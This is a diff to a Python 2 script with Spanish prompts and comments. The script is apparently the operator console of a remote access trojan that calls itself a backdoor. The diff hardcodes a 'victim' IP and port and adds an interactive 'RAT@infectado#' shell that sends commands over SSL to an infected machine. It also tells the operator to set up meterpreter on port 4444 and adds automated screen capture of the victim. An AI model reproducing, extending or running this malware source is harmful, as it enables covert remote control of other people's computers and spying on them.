@@ -1,4 +1,8 @@
 #!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+victim='192.168.47.144'
+puerto=6116
 
 def info():
 	print '''
@@ -9,7 +13,8 @@ def info():
 
 			 PBSCG10!
 
-		 FACTA, NON VERBA!
+		FACTA, NON VERBA!
+
 	'''
 
 def salir():
@@ -37,21 +42,26 @@ def trasera(sslSock):
 	#ctx.use_certificate_file('cert.pem')  
 	#sslSock = SSL.Connection(ctx, sock)  
 	#sslSock.connect(ADDRESS)  
-	def main():  
+	while True:  
 	        try:
 	            cmd = raw_input('RAT@infectado# ')
-	            sslSock.send(cmd)
+	            if cmd.isdigit():
+	            	sslSock.send('date')
+	            elif cmd == 'quit' or cmd ==  'exit' or cmd ==  'q':
+	            	return
+	            else:
+	            	sslSock.send(cmd)
 	            data = sslSock.recv(66384)
 	            if data=='\n':
 	            	sslSock.send(cmd)
 	            else:
 	            	print data
 	        except KeyboardInterrupt:
-	            sslSock.close()
-	            sys.exit(0)
-
-	while True:  
-	   main()
+	        	return
+	            #sslSock.close()
+	            #sys.exit(0)
+	#while True:  
+	#   main()
 
 
 def menu():
@@ -98,13 +108,16 @@ def menu():
 		elif eleccion == 1:
 			try:  
 				sslSock.connect(ADDRESS)
+				raw_input("Procure no cometer errores, este backdoor es muy exigente :)... [ENTER]\n")
 				sslSock.write('1')
-				print "Procure no cometer errores, este backdoor es muy exigente :)...\n"
 				trasera(sslSock)
+				sslSock.close()
 			except:
 				raw_input("Presione una tecla para continuar...")
 				os.system('clear')
 				#sslSock.close()
+				#salir()
+				#exit(0)
 		elif eleccion == 2:
 			try:
 				#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
@@ -112,7 +125,7 @@ def menu():
 				#ctx.use_certificate_file('cert.pem')  
 				#sslSock = SSL.Connection(ctx, sock)  
 				sslSock.connect(ADDRESS)  
-				raw_input("Antes de continuar, configure meterpreter ;), puerto 4444...")
+				raw_input("Antes de continuar, configure meterpreter ;), puerto 4444... [ENTER]")
 				sslSock.write('2')
 				msg=sslSock.recv(1024)
 				print msg+'\n'
@@ -124,9 +137,23 @@ def menu():
 				os.system('clear')
 				#sslSock.close()
 		elif eleccion == 3:
-			print "No implementado aun :)"
-			raw_input("Presione una tecla para continuar...")
-			os.system('clear')
+			try:
+				#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
+				#ctx = SSL.Context(SSL.SSLv23_METHOD)  
+				#ctx.use_certificate_file('cert.pem')  
+				#sslSock = SSL.Connection(ctx, sock)  
+				sslSock.connect(ADDRESS)  
+				raw_input("Esta a punto de automatizar la captura de pantalla... [ENTER]")
+				sslSock.write('3')
+				msg=sslSock.recv(1024)
+				print msg+'\n'
+				raw_input("Presione una tecla para continuar...")
+				os.system('clear')
+				#sslSock.close()
+			except:
+				raw_input("Presione una tecla para continuar...")
+				os.system('clear')
+				#sslSock.close()
 		elif eleccion == 4:
 			print "No implementado aun :)"
 			raw_input("Presione una tecla para continuar...")
